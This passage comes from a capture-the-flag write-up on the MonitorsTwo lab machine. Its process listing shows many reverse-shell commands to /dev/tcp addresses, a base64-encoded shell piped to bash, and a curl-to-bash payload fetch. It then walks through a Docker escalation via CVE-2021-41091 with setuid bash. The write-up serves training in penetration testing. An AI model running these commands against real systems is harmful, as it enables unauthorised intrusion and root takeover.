        │   ├─  5162 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ; /bin/sh -c "bash -c 'bash -i >& /dev/tcp/10.10.16.51/4444 0>&1'"
        │   ├─  5164 /bin/sh -c bash -c 'bash -i >& /dev/tcp/10.10.16.51/4444 0>&1'
        │   ├─  5165 bash -c bash -i >& /dev/tcp/10.10.16.51/4444 0>&1
        │   ├─  5166 bash -i
        │   ├─  6537 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.122/9876 0>&1'
        │   ├─  6539 bash -c bash -i >& /dev/tcp/10.10.14.122/9876 0>&1
        │   ├─  6540 bash -i
        │   ├─ 38062 sh -p
        │   ├─ 38063 bash -p
        │   ├─ 38066 sh -p
        │   ├─ 38358 apache2 -DFOREGROUND
        │   ├─ 38485 apache2 -DFOREGROUND
        │   ├─ 38514 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.16.62/9999 0>&1'
        │   ├─ 38516 bash -c bash -i >& /dev/tcp/10.10.16.62/9999 0>&1
        │   ├─ 38517 bash -i
        │   ├─ 38532 apache2 -DFOREGROUND
        │   ├─ 38536 /bin/bash
        │   ├─ 38662 mysql --host=db --user=root --password=x xx
        │   ├─ 38851 apache2 -DFOREGROUND
        │   ├─ 38984 apache2 -DFOREGROUND
        │   ├─ 39044 apache2 -DFOREGROUND
        │   ├─ 39108 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.16.42/789 0>&1'
        │   ├─ 39110 bash -c bash -i >& /dev/tcp/10.10.16.42/789 0>&1
        │   ├─ 39111 bash -i
        │   ├─ 39225 mysql --host=db --user=root -p
        │   ├─ 39267 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.123/7474 0>&1'
        │   ├─ 39269 bash -c bash -i >& /dev/tcp/10.10.14.123/7474 0>&1
        │   ├─ 39270 bash -i
        │   ├─ 56025 apache2 -DFOREGROUND
        │   ├─ 56059 apache2 -DFOREGROUND
        │   ├─ 56100 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.16.42/789 0>&1'
        │   ├─ 56102 bash -c bash -i >& /dev/tcp/10.10.16.42/789 0>&1
        │   ├─ 56103 bash -i
        │   ├─ 56104 bash -p
        │   ├─ 56118 /bin/bash
        │   ├─ 56120 script /dev/null -c bash
        │   ├─ 56121 sh -c bash
        │   ├─ 56122 bash
        │   ├─ 56127 bash -p
        │   ├─ 56247 mysql --host=db --user=root --password=x xx cacti
        │   ├─ 56273 apache2 -DFOREGROUND
        │   ├─ 56302 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.16.42/789 0>&1'
        │   ├─ 56304 bash -c bash -i >& /dev/tcp/10.10.16.42/789 0>&1
        │   ├─ 56305 bash -i
        │   ├─ 56306 bash -p
        │   ├─ 56309 script /dev/null -c bash
        │   ├─ 56310 sh -c bash
        │   ├─ 56311 bash
        │   ├─ 56313 bash -p
        │   ├─ 68453 apache2 -DFOREGROUND
        │   ├─ 90678 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime 1;echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTM0LzQ0NDMgPCYxJw== | base64 -d | bash -
        │   ├─ 90682 bash -
        │   ├─ 90683 bash -i
        │   ├─ 90783 apache2 -DFOREGROUND
        │   ├─ 90784 apache2 -DFOREGROUND
        │   ├─ 90836 apache2 -DFOREGROUND
        │   ├─ 90837 apache2 -DFOREGROUND
        │   ├─108209 apache2 -DFOREGROUND
        │   ├─123697 apache2 -DFOREGROUND
        │   ├─127658 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime 1;echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTUwLzQ0NDMgPCYxJw== | base64 -d | bash -
        │   ├─127662 bash -
        │   ├─127663 bash -i
        │   ├─127698 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ; /bin/sh -c "curl 10.10.14.96:777/shell.sh|bash"
        │   ├─127663 bash -i
        │   ├─127698 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ; /bin/sh -c "curl 10.10.14.96:777/shell.sh|bash"
        │   ├─127700 /bin/sh -c curl 10.10.14.96:777/shell.sh|bash
        │   ├─127702 bash
        │   ├─127703 bash -i
        │   ├─127705 apache2 -DFOREGROUND
        │   ├─127706 /bin/bash
        │   └─127711 apache2 -DFOREGROUND
        └─system.slice 
          ├─containerd.service 
          │ ├─ 897 /usr/bin/containerd
          │ ├─1234 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 -address /run/containerd/containerd.sock
          │ └─1347 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e -address /run/containerd/containerd.sock
          ├─docker.service 
          │ ├─ 883 /usr/sbin/dockerd -H fd://
          │ └─1332 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80
        ```

        The commands of the other players given inside the container containing the php web app are visible! XD

    ```
    ╔══════════╣ Mails (limit 50)
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus                                                                                                                                                    
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
    ```

    - `cat /var/mail/marcus`
        ```
        From: administrator@monitorstwo.htb
        To: all@monitorstwo.htb
        Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

        Dear all,

        We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

        CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

        CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

        CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

        We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

        Best regards,

        Administrator
        CISO
        Monitor Two
        Security Team
        ```

        - `uname -r`
            ```
            5.4.0-147-generic
            ```
        - `docker -v`
            ```
            Docker version 20.10.5+dfsg1, build 55c4c88
            ```

            it's vulnerable!

    ```
    ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
    
    /dev/mqueue
    /dev/shm
    /home/marcus
    /run/lock
    /run/screen
    /run/user/1000
    /run/user/1000/gnupg
    /run/user/1000/inaccessible
    /run/user/1000/systemd
    /run/user/1000/systemd/units
    ```

- Exploit the CVE-2021-41091 vulnerability: https://github.com/UncleJ4ck/CVE-2021-41091

    - I download `exp.sh` from my host and run it as marcus
    -
        ```
        [!] Vulnerable to CVE-2021-41091
        [!] Now connect to your Docker container that is accessible and obtain root access !
        [>] After gaining root access execute this command (chmod u+s /bin/bash)
        ```
    - I rerun [https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit) to get a shell inside the container
    - I become root of the container: `capsh --gid=0 --uid=0 --`
    - I execute the given command: `chmod u+s /bin/bash`
    -   ```
        Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
        ```

        `yes`

    -   ```
        [!] Available Overlay2 Filesystems:
        /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
        /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

        [!] Iterating over the available Overlay2 filesystems !
        [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
        [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

        [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
        [!] Rooted !
        [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
        [?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

        [!] Spawning Shell
        bash-5.1# exit
        ```
    - `cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged && ./bin/bash -p` -> rooted!

- Here's what was behind this docker container:
    - `cat /root/cacti/docker-compose.yml`
        ```yaml
        version: '2'
        services:
        web:
            image: cacti:latest
            ports:
            - "127.0.0.1:8080:80"
            depends_on:
            - db
            entrypoint:
            - bash
            - /entrypoint.sh
            volumes:
            - ./entrypoint.sh:/entrypoint.sh
            command: apache2-foreground
            cap_drop:
            - mknod
            - dac_override
        db:
        image: mysql:5.7
        environment:
            - MYSQL_ROOT_PASSWORD=root
            - MYSQL_DATABASE=cacti
        ```
